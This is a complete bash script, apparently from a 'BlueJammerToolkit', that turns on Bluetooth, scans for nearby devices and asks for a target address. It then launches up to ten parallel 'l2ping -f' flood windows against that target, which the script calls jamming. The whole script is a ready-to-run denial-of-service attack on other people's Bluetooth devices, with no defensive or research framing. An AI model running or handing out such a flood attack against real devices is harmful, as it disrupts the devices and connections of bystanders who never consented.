#!/bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Cyan="\033[0;36m"
nc="\e[0m"

cat /usr/share/BlueJammerToolkit/core/graffiti/banner.txt

echo -e "$grey If your Bluetooth is already enabled, please enter 'no' to skip.$nc"
read -p $'\033[1;33m[*] Do you want to enable Bluetooth? (yes/no): \033[0m' enable_bluetooth
enable_bluetooth=$(echo "$enable_bluetooth" | tr '[:upper:]' '[:lower:]')

if [[ "$enable_bluetooth" == "yes" || "$enable_bluetooth" == "y" ]]; then
    echo -e "$purple [i] Starting Bluetooth service...$nc"
    systemctl start bluetooth.service &>/dev/null

    if rfkill unblock bluetooth; then
        echo -e "$yellow [+] Your Bluetooth is Turned On$nc"
    else
        echo -e "$red [-] Some Problem With Turning On Bluetooth (Check RFKILL)$nc"
        exit 1
    fi
elif [[ "$enable_bluetooth" == "no" ]]; then
    echo -e "$yellow [*] Skipping Bluetooth enabling...$nc"
else
    echo -e "$red [-] Invalid input. Please enter 'yes' or 'no'. Exiting...$nc"
    exit 1
fi

echo -e ""
clear
cat /usr/share/BlueJammerToolkit/core/graffiti/banner.txt

echo -e "$Cyan [*] - SCANNING FOR BLUETOOTH DEVICES - [*] $nc"
echo -e ""
echo -e "$yellow [+] Scanning, Please wait..."
xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
scanner_pid=$!

jammer_pids=()

cleanup() {
    echo -e "$red [*] Stopping and Exiting...$nc"
    kill "$scanner_pid"
    for pid in "${jammer_pids[@]}"; do
        kill "$pid"
    done
    exit
}

trap cleanup SIGINT

read -p $'\033[1;33m[*] Enter B.D. Address (xx:xx:xx:xx:xx:xx): \033[0m' bdadd
echo -e "$purple [*] Performing checks...$nc"
echo -e ""

while true; do
    read -p $'\033[1;33m[*] How many windows to open for jamming (1-10)? \033[0m' num_windows
    if [[ "$num_windows" =~ ^[0-9]+$ ]] && [ "$num_windows" -ge 1 ] && [ "$num_windows" -le 10 ]; then
        break
    else
        echo -e "$red [-] Invalid input. Please enter a number between 1 and 10.$nc"
    fi
done

echo -e ""
read -p $'\033[1;33m[*] Press [ENTER] To Start Jamming. ('"$bdadd"') \033[0m'
echo -e ""

clear
cat /usr/share/BlueJammerToolkit/core/graffiti/banner.txt
echo -e "$purple [*] Jamming Started [$red Press CTRL + C To Stop$nc]..."
for ((i = 1; i <= num_windows; i++)); do
    xterm -e l2ping -f "$bdadd" &
    jammer_pids+=($!)
done

wait